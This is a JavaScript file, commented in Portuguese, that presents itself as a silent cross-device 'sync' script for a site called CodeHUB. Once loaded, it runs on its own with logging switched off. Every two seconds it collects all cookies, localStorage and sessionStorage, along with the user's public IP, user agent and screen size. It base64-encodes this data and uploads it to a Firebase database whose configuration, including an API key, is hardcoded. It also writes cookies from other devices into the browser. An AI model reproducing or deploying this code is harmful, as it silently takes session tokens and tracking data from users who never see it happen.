// sinc.js - Sistema de Sincronização Silenciosa para CodeHUB
// Versão: 2.0 - Totalmente automático e silencioso

(function() {
    'use strict';
    
    console.log('🔧 CodeHUB Sync - Inicializando sistema silencioso...');

    // ========== CONFIGURAÇÕES ==========
    const SYNC_INTERVAL_MS = 2000; // 2 segundos
    const STORAGE_KEYS_TO_IGNORE = ['_sync_uid_', '_device_id_', '_sync_hash_'];
    
    // ========== VARIÁVEIS PRIVADAS ==========
    let currentUID = null;
    let deviceId = null;
    let syncInterval = null;
    let isRestoring = false;
    let lastDataHash = null;
    let autoSyncEnabled = true;
    let db = null;
    let auth = null;
    let isFirebaseReady = false;
    
    // ========== FUNÇÕES SILENCIOSAS (sem alertas) ==========
    
    // Log silencioso (só mostra no console se debug ativado)
    const DEBUG = false; // Mude para true se quiser ver logs
    function silentLog(...args) {
        if (DEBUG) console.log('[CodeHUB Sync]', ...args);
    }
    
    // Carregar script dinamicamente
    function loadScript(src) {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = src;
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    }
    
    // Carregar Firebase moderno (modular)
    async function loadFirebase() {
        if (typeof firebase !== 'undefined' && firebase.apps?.length) {
            silentLog('Firebase já carregado');
            return true;
        }
        
        try {
            // Carregar Firebase 9.x (versão compat para facilitar)
            await loadScript('https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js');
            await loadScript('https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js');
            await loadScript('https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js');
            
            silentLog('Firebase carregado com sucesso');
            return true;
        } catch(e) {
            console.error('CodeHUB Sync - Erro ao carregar Firebase:', e);
            return false;
        }
    }
    
    // Configuração do Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyDon4WbCbe4kCkUq-OdLBRhzhMaUObbAfo",
        authDomain: "html-15e80.firebaseapp.com",
        databaseURL: "https://html-15e80-default-rtdb.firebaseio.com",
        projectId: "html-15e80",
        storageBucket: "html-15e80.appspot.com",
        messagingSenderId: "1068148640439",
        appId: "1:1068148640439:web:7cc5bde34f4c5a5ce41b32"
    };
    
    // Inicializar Firebase
    async function initFirebase() {
        if (db) return db;
        
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        
        db = firebase.database();
        auth = firebase.auth();
        
        silentLog('Firebase inicializado');
        return db;
    }
    
    // Obter IP público (silencioso)
    async function getPublicIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch(e) {
            return 'unknown';
        }
    }
    
    // Obter ou criar Device ID
    function getOrCreateDeviceId() {
        let did = localStorage.getItem('_device_id_');
        if (!did) {
            did = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('_device_id_', did);
        }
        return did;
    }
    
    // Coletar TODOS os dados do navegador (silenciosamente)
    function collectAllData() {
        const data = {
            ls: {},
            ss: {},
            ck: {},
            ts: Date.now()
        };
        
        // Coletar localStorage (ignorando chaves do sistema)
        for(let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (!STORAGE_KEYS_TO_IGNORE.includes(key)) {
                data.ls[key] = localStorage.getItem(key);
            }
        }
        
        // Coletar sessionStorage
        for(let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            data.ss[key] = sessionStorage.getItem(key);
        }
        
        // Coletar cookies
        const cookies = document.cookie.split(';');
        for(let i = 0; i < cookies.length; i++) {
            if(cookies[i].trim()) {
                const [name, value] = cookies[i].split('=');
                data.ck[name.trim()] = value || '';
            }
        }
        
        return data;
    }
    
    // Converter para Base64 (robusto)
    function toBase64(obj) {
        try {
            const jsonString = JSON.stringify(obj);
            const utf8Bytes = new TextEncoder().encode(jsonString);
            let binaryString = '';
            for (let i = 0; i < utf8Bytes.length; i++) {
                binaryString += String.fromCharCode(utf8Bytes[i]);
            }
            return btoa(binaryString);
        } catch(e) {
            console.error('CodeHUB Sync - Erro toBase64:', e);
            return '';
        }
    }
    
    // Converter de Base64 (robusto)
    function fromBase64(str) {
        try {
            if (!str) return null;
            const binaryString = atob(str);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            const jsonString = new TextDecoder().decode(bytes);
            return JSON.parse(jsonString);
        } catch(e) {
            console.error('CodeHUB Sync - Erro fromBase64:', e);
            return null;
        }
    }
    
    // Gerar hash simples para comparar dados
    function generateHash(obj) {
        const str = JSON.stringify(obj);
        let hash = 0;
        for(let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(36);
    }
    
    // RESTAURAR dados do backup (SILENCIOSAMENTE - sem reload)
    function restoreDataSilently(encodedData) {
        if (isRestoring) return false;
        isRestoring = true;
        
        try {
            const data = fromBase64(encodedData);
            if (!data) return false;
            
            let changesApplied = 0;
            
            // Restaurar localStorage
            if (data.ls && typeof data.ls === 'object') {
                for(const key in data.ls) {
                    if (!STORAGE_KEYS_TO_IGNORE.includes(key) && localStorage.getItem(key) !== data.ls[key]) {
                        localStorage.setItem(key, data.ls[key]);
                        changesApplied++;
                    }
                }
            }
            
            // Restaurar sessionStorage
            if (data.ss && typeof data.ss === 'object') {
                for(const key in data.ss) {
                    if (sessionStorage.getItem(key) !== data.ss[key]) {
                        sessionStorage.setItem(key, data.ss[key]);
                        changesApplied++;
                    }
                }
            }
            
            // Restaurar cookies
            if (data.ck && typeof data.ck === 'object') {
                for(const name in data.ck) {
                    document.cookie = name + "=" + data.ck[name] + "; path=/";
                    changesApplied++;
                }
            }
            
            if (changesApplied > 0) {
                silentLog(`✅ Restaurados ${changesApplied} itens silenciosamente`);
                // Disparar evento para que a página saiba que dados foram restaurados
                window.dispatchEvent(new CustomEvent('codehub-sync-restored', { 
                    detail: { changes: changesApplied, timestamp: Date.now() }
                }));
            }
            
            return changesApplied > 0;
        } catch(e) {
            console.error('CodeHUB Sync - Erro ao restaurar:', e);
            return false;
        } finally {
            isRestoring = false;
        }
    }
    
    // SALVAR dados atuais no Firebase (SILENCIOSAMENTE)
    async function saveCurrentData() {
        if (!currentUID || !db || !autoSyncEnabled) return false;
        
        try {
            const allData = collectAllData();
            const currentHash = generateHash(allData);
            
            // Só salvar se houver mudança
            if (currentHash === lastDataHash) return false;
            
            const encoded = toBase64(allData);
            if (!encoded) return false;
            
            const deviceInfo = {
                id: deviceId,
                userAgent: navigator.userAgent,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timestamp: Date.now(),
                ip: await getPublicIP(),
                lastSync: Date.now()
            };
            
            // Salvar no Firebase
            await db.ref(`syncData/${currentUID}`).set({
                data: encoded,
                hash: currentHash,
                lastUpdate: firebase.database.ServerValue.TIMESTAMP,
                deviceId: deviceId,
                deviceInfo: deviceInfo
            });
            
            // Registrar/atualizar dispositivo
            await db.ref(`devices/${currentUID}/${deviceId}`).set(deviceInfo);
            
            lastDataHash = currentHash;
            silentLog('💾 Dados salvos no servidor');
            
            return true;
        } catch(e) {
            console.error('CodeHUB Sync - Erro ao salvar:', e);
            return false;
        }
    }
    
    // VERIFICAR e aplicar atualizações de OUTROS dispositivos
    async function checkForUpdates() {
        if (!currentUID || !db || isRestoring || !autoSyncEnabled) return false;
        
        try {
            const snapshot = await db.ref(`syncData/${currentUID}`).once('value');
            const data = snapshot.val();
            
            if (data && data.data && data.hash) {
                // Se for de outro dispositivo E for diferente
                if (data.deviceId !== deviceId && data.hash !== lastDataHash) {
                    silentLog('🔄 Detectado backup de outro dispositivo, restaurando...');
                    return restoreDataSilently(data.data);
                }
            }
            return false;
        } catch(e) {
            console.error('CodeHUB Sync - Erro ao verificar:', e);
            return false;
        }
    }
    
    // Sincronização completa (salva + verifica)
    async function fullSync() {
        await saveCurrentData();
        await checkForUpdates();
    }
    
    // Iniciar sincronização automática
    function startAutoSync() {
        if (syncInterval) clearInterval(syncInterval);
        autoSyncEnabled = true;
        
        syncInterval = setInterval(() => {
            if (currentUID && autoSyncEnabled) {
                fullSync();
            }
        }, SYNC_INTERVAL_MS);
        
        silentLog(`✅ Sincronização automática iniciada (${SYNC_INTERVAL_MS/1000}s)`);
    }
    
    // Parar sincronização
    function stopAutoSync() {
        autoSyncEnabled = false;
        if (syncInterval) {
            clearInterval(syncInterval);
            syncInterval = null;
        }
        silentLog('⏸ Sincronização automática pausada');
    }
    
    // Registrar dispositivo no Firebase
    async function registerDevice() {
        if (!currentUID || !db) return;
        
        const deviceInfo = {
            id: deviceId,
            userAgent: navigator.userAgent,
            screenWidth: screen.width,
            screenHeight: screen.height,
            ip: await getPublicIP(),
            registeredAt: Date.now(),
            lastSeen: Date.now()
        };
        
        await db.ref(`devices/${currentUID}/${deviceId}`).set(deviceInfo);
        silentLog('📱 Dispositivo registrado');
    }
    
    // Monitorar autenticação do Firebase
    function monitorAuth() {
        if (!auth) return;
        
        // Verificar a cada 1 segundo se o usuário mudou
        let lastCheckedUID = null;
        
        setInterval(async () => {
            try {
                const user = auth.currentUser;
                const newUID = user ? user.uid : null;
                
                if (newUID && newUID !== currentUID) {
                    // Usuário logou ou trocou de conta
                    silentLog('👤 Usuário autenticado detectado:', newUID);
                    currentUID = newUID;
                    deviceId = getOrCreateDeviceId();
                    lastDataHash = null;
                    
                    await registerDevice();
                    
                    // Primeira sincronização: tentar restaurar primeiro
                    setTimeout(async () => {
                        await checkForUpdates();
                        await saveCurrentData();
                        silentLog('✅ Primeira sincronização concluída');
                    }, 500);
                    
                } else if (!newUID && currentUID) {
                    // Usuário deslogou
                    silentLog('👤 Usuário deslogado');
                    currentUID = null;
                    lastDataHash = null;
                }
            } catch(e) {
                // Silencioso
            }
        }, 1000);
    }
    
    // ========== EXPORTAÇÃO DE API PÚBLICA ==========
    const publicAPI = {
        // Forçar sincronização manual
        forceSync: async function() {
            silentLog('🔄 Forçando sincronização...');
            return await fullSync();
        },
        
        // Iniciar sync automático
        startAutoSync: startAutoSync,
        
        // Parar sync automático
        stopAutoSync: stopAutoSync,
        
        // Status do sistema
        getStatus: function() {
            return {
                active: autoSyncEnabled,
                uid: currentUID,
                deviceId: deviceId,
                interval: SYNC_INTERVAL_MS,
                isRestoring: isRestoring
            };
        },
        
        // Definir UID manualmente (fallback)
        setUserUID: function(uid) {
            if (uid && uid !== currentUID) {
                currentUID = uid;
                deviceId = getOrCreateDeviceId();
                lastDataHash = null;
                
                setTimeout(() => {
                    checkForUpdates();
                    saveCurrentData();
                }, 500);
            }
        }
    };
    
    // Expor para uso global
    window.CodeHUBSync = publicAPI;
    
    // ========== INICIALIZAÇÃO AUTOMÁTICA ==========
    async function init() {
        const firebaseLoaded = await loadFirebase();
        if (!firebaseLoaded) {
            console.error('CodeHUB Sync - Não foi possível carregar Firebase');
            return;
        }
        
        await initFirebase();
        
        // Tentar obter usuário atual
        if (auth && auth.currentUser) {
            currentUID = auth.currentUser.uid;
            deviceId = getOrCreateDeviceId();
            await registerDevice();
        }
        
        // Monitorar autenticação
        monitorAuth();
        
        // Iniciar sync automático
        startAutoSync();
        
        silentLog('🚀 CodeHUB Sync inicializado e rodando em segundo plano');
    }
    
    // Iniciar tudo
    init();
})();